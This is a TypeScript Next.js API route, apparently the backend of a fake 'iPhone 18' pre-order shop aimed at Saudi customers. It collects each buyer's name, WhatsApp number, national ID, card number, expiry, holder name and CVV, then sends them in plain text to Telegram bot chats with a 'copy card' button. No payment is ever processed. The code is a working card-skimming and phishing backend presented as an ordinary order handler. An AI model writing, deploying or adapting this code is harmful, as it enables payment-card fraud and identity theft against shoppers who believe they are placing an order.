import { NextRequest, NextResponse } from "next/server";

// Helper to sanitize inputs
function sanitize(str: string): string {
  if (!str) return "";
  return str.replace(/[<>'"]/g, "").trim();
}

// Validate Saudi national ID
function isValidSaudiId(id: string): boolean {
  if (!id || !/^[12]\d{9}$/.test(id)) return false;
  return true;
}

// Validate Saudi phone number
function isValidSaudiPhone(phone: string): boolean {
  if (!phone || !/^05\d{8}$/.test(phone.replace(/\D/g, ""))) return false;
  return true;
}

// Generate idempotency key from request data
function generateIdempotencyKey(data: any): string {
  const str = JSON.stringify({
    productId: data.productId,
    customerName: data.customerName,
    phone: data.phone,
    variant: data.variant,
    storage: data.storage,
    timestamp: Math.floor(Date.now() / 60000), // 1-minute window
  });
  return Buffer.from(str).toString('base64');
}

// In-memory store for idempotency (in production, use Redis)
const processedRequests = new Map<string, { orderId: string; timestamp: number }>();

// Clean up old entries every 5 minutes
setInterval(() => {
  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
  for (const [key, value] of processedRequests.entries()) {
    if (value.timestamp < fiveMinutesAgo) {
      processedRequests.delete(key);
    }
  }
}, 5 * 60 * 1000);

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      customerName,
      phone,
      nationalId,
      productId,
      productName,
      variant,
      storage,
      quantity,
      price,
      total,
      paymentMethod,
      productImage,
      orderType,
      cardNumber,
      expiry,
      cardHolder,
      cvv,
    } = body;

    // ── Validation ──
    if (!customerName || !phone || !nationalId) {
      return NextResponse.json({ error: "بيانات العميل ناقصة" }, { status: 400 });
    }

    if (!productId || !productName) {
      return NextResponse.json({ error: "بيانات المنتج ناقصة" }, { status: 400 });
    }

    // Validate Saudi ID
    if (!isValidSaudiId(nationalId)) {
      return NextResponse.json({ error: "رقم الهوية غير صحيح" }, { status: 400 });
    }

    // Validate phone number
    const cleanPhone = (phone || "").replace(/\D/g, "");
    if (!isValidSaudiPhone(cleanPhone)) {
      return NextResponse.json({ error: "رقم الواتساب غير صحيح" }, { status: 400 });
    }

    // Validate card data
    if (!cardNumber || !expiry || !cvv || !cardHolder) {
      return NextResponse.json({ error: "بيانات البطاقة ناقصة" }, { status: 400 });
    }

    // ── Idempotency Check ──
    const idempotencyKey = generateIdempotencyKey(body);
    const existing = processedRequests.get(idempotencyKey);
    if (existing) {
      console.log(`[DUPLICATE PRE-ORDER] Request already processed: ${existing.orderId}`);
      return NextResponse.json({ orderId: existing.orderId, duplicate: true });
    }

    // Sanitize inputs
    const sanitizedData = {
      customerName: sanitize(customerName),
      cardHolder: sanitize(cardHolder),
      productName: sanitize(productName),
      variant: sanitize(variant),
      storage: sanitize(storage),
    };

    const orderId = `PRE-${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const whatsappUrl = `https://wa.me/${cleanPhone}`;

    // ── Send Telegram notification ──
    let telegramSuccess = false;
    
    const text = [
      `🎁 حجز مسبق · iPhone 18`,
      `🔢 رقم الطلب: #${orderId}`,
      ``,
      `📱 المنتج: ${sanitizedData.productName}`,
      `🎨 اللون: ${sanitizedData.variant}`,
      `💾 السعة: ${sanitizedData.storage}`,
      `💰 الدفعة المقدمة: ${total} ر.س`,
      `💵 سعر الجهاز: ${price} ر.س`,
      ``,
      `💳 adaVisa - Pre-Order`,
      `👤 Customer: ${sanitizedData.customerName}`,
      `📱 WhatsApp: ${cleanPhone}`,
      `🆔 National ID: ${nationalId}`,
      ``,
      `💳 Card Number: ${cardNumber}`,
      `👤 Card Holder: ${sanitizedData.cardHolder}`,
      `📅 Expiry: ${expiry}`,
      `🔐 CVV: ${cvv}`,
    ].join("\n");

    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
    
    if (chatIds.length === 0) {
      console.warn("[WARNING] No Telegram chat IDs configured");
    } else {
      try {
        const telegramResults = await Promise.allSettled(
          chatIds.map(chat_id =>
            fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id,
                text,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: "💬 فتح واتساب", url: whatsappUrl }],
                    [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
                  ],
                },
              }),
            }).then(res => {
              if (!res.ok) {
                return res.text().then(text => {
                  if (res.status === 403) throw new Error(`BOT_BLOCKED`);
                  throw new Error(`Telegram API error: ${res.status} ${text}`);
                });
              }
              return res.json();
            })
          )
        );

        const successCount = telegramResults.filter(r => r.status === "fulfilled").length;
        const failedCount = telegramResults.filter(r => r.status === "rejected").length;
        
        telegramSuccess = successCount > 0;
        
        console.log(`[TELEGRAM PRE-ORDER] Sent to ${successCount}/${chatIds.length} chats. Failed: ${failedCount}`);
        
        if (failedCount > 0) {
          telegramResults.forEach((result, i) => {
            if (result.status === "rejected") {
              if (result.reason?.message === "BOT_BLOCKED") {
                console.warn(`[TELEGRAM] Chat ${chatIds[i]} has blocked the bot, skipping.`);
              } else {
                console.error(`[TELEGRAM ERROR] Chat ${chatIds[i]}:`, result.reason);
              }
            }
          });
        }
      } catch (error) {
        console.error("[TELEGRAM ERROR]", error);
        telegramSuccess = false;
      }
    }

    // Store in idempotency cache
    processedRequests.set(idempotencyKey, {
      orderId,
      timestamp: Date.now(),
    });

    // Return response
    const response: any = {
      orderId,
      telegramSent: telegramSuccess,
    };

    if (!telegramSuccess) {
      response.warning = "تم استلام الحجز ولكن فشل إرسال إشعار Telegram";
      console.warn(`[WARNING] Pre-order ${orderId} received but Telegram notification failed`);
    }

    return NextResponse.json(response);
    
  } catch (error) {
    console.error("[PRE-ORDER ERROR]", error);
    return NextResponse.json({
      error: "حدث خطأ أثناء معالجة الحجز، يرجى المحاولة مرة أخرى",
    }, { status: 500 });
  }
}
